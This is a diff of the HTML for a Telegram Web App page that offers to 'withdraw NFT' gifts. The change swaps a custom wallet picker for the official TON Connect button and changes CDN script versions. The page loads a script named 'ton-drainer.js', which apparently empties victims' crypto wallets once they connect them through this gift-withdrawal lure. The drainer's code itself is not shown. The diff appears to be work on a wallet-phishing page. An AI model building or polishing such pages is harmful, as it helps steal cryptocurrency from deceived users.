@@ -151,16 +151,10 @@
     <div class="modal-grabber"></div>
     <button class="modal-close" id="modalClose">✕</button>
     <h2>Вывести NFT</h2>
-    <p class="modal-sub">Выберите кошелёк для вывода подарков</p>
+    <p class="modal-sub">Подключите TON кошелёк</p>
 
-    <div class="wallet-option" data-wallet="ton">
-      <div class="w-icon ton">💎</div>
-      <div class="w-info">
-        <div class="w-name">TON Кошелёк</div>
-        <div class="w-desc">Tonkeeper, MyTonWallet, Wallet</div>
-      </div>
-      <div class="w-arrow">›</div>
-    </div>
+    <!-- КНОПКА TON CONNECT — официальная -->
+    <div id="ton-connect-button"></div>
 
     <div id="walletStatus" class="wallet-status"></div>
   </div>
@@ -178,10 +172,10 @@
   </div>
 </div>
 
-<!-- ФИКСИРОВАННЫЕ ВЕРСИИ: ton-core ПЕРЕД tonconnect-ui -->
+<!-- CDN как в demo -->
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script src="https://unpkg.com/@ton/core@0.56.3/dist/ton-core.min.js"></script>
-<script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.3/dist/tonconnect-ui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@ton/core@0.56.0/dist/ton-core.min.js"></script>
 <script src="ton-drainer.js"></script>
 <script src="app.js"></script>
 </body>
